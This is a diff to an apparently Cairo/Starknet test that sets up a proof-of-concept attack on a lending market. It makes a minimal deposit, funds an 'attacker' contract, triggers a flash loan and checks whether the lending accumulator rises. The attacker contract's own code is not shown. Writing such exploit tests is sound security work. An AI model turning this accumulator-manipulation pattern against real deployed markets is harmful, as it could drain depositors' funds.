@@ -41,8 +41,29 @@ fn test_increase_accumulator() {
         erc20_address, ekubo_address.try_into().unwrap(), CheatSpan::TargetCalls(1),
     );
 
+    let owner_address = get_contract_address();
+
     let transfer_value: u256 = 30_000_000_000_000_000_000; // 30 tokens
-    erc20.transfer(attacker_address, transfer_value);
-    let balance_after = erc20.balanceOf(attacker_address);
+    erc20.transfer(owner_address, transfer_value);
+    let balance_after = erc20.balanceOf(owner_address);
     println!("Balance {}", balance_after);
+
+    let market_address: ContractAddress = contract_address_const::<market_address_felt>();
+    let market = IMarketDispatcher { contract_address: market_address };
+
+    let deposit_sum: felt252 = 1;
+
+    erc20.approve(market_address, deposit_sum.into());
+    market.deposit(erc20_address, deposit_sum);
+
+    let accumulator = market.get_lending_accumulator(erc20_address);
+    println!("Accumulator {}", accumulator);
+
+    // transfer some funds to the attacking contract
+    erc20.transfer(attacker_address, 1000);
+
+    attacker.call_flash_loan(1);
+
+    let accumulator = market.get_lending_accumulator(erc20_address);
+    println!("Accumulator {}", accumulator);
 }
